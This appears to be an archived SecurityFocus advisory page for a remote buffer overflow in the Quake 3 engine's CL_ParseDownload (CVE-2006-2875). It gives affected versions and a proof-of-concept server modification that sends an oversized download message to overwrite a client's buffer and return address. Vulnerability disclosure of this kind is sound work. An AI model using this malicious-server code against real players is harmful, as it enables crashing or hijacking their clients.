@@ -1,0 +1,102 @@
+#SpeeDr00t@Black Falcon<br>#bid18271<p><b><span style="font-size: 18pt;">Quake 3 Engine CL_ParseDownload Remote Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/18271/info">info</a><br><a href="http://www.securityfocus.com/bid/18271/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/18271/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/18271/solution">solution</a><br><a href="http://www.securityfocus.com/bid/18271/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				18271
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2006-2875<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 05 2006 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2015 09:01PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery is credited to Luigi Auriemma &lt;aluigi@autistici.org&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					id Software Quake 3 Arena  1.32c<br/>
+					
+				
+					icculus.org Quake 3  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					icculus.org Quake 3  revision 796<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The server may be modified to send data sufficient to demonstrate this issue. The following code should be added to the 'code/server/sv_client.c' source file, after the '// send the gamestate' command at approximately line 575:<br/><br/>// send the gamestate<br/>int     i;<br/>MSG_WriteByte( &amp;amp;msg, svc_download );<br/>MSG_WriteShort( &amp;amp;msg, -1 );         // block != 0, for fast return<br/>MSG_WriteShort( &amp;amp;msg, 16384 + 32 ); // amount of bytes to copy<br/>for(i = 0; i &amp;lt; 16384; i++) {        // overwrite the data buffer<br/>    MSG_WriteByte(&amp;amp;msg, 0x00);      // 0x00 for saving space<br/>}<br/>for(i = 0; i &amp;lt; 32; i++) {           // do the rest of the job<br/>    MSG_WriteByte(&amp;amp;msg, 'a');       // return address: 0x61616161<br/>}<br/>SV_SendMessageToClient( &amp;amp;msg, client );<br/>return;
+	
+		<ul>
+</ul>
+</div>
